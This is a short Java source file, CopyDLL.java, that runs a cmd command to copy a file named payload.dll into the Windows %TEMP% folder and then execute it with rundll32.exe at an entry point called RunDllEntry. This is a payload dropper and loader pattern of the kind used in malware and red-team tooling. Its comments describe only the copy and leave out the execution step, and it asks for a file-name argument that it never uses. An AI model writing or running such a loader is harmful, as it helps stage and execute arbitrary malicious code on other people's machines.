// javac CopyDLL.java

import java.io.IOException;

public class CopyDLL {
    public static void main(String[] args) {
        try {
            // Check if a file name is provided as a command-line argument
            if (args.length == 0) {
                System.out.println("Usage: java CopyDLL <file_name>");
                return;
            }
            
            // Construct the command to copy the file to %TEMP% as payload.dll
            String command = "cmd /c copy payload.dll %TEMP%\\payload.dll /y & rundll32.exe %TEMP%\\payload.dll,RunDllEntry";
            
            // Execute the command
            Process process = Runtime.getRuntime().exec(command);
            
            // Wait for the process to finish
            process.waitFor();
            
            // Print success message
            System.out.println("Command executed successfully.");
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }
}



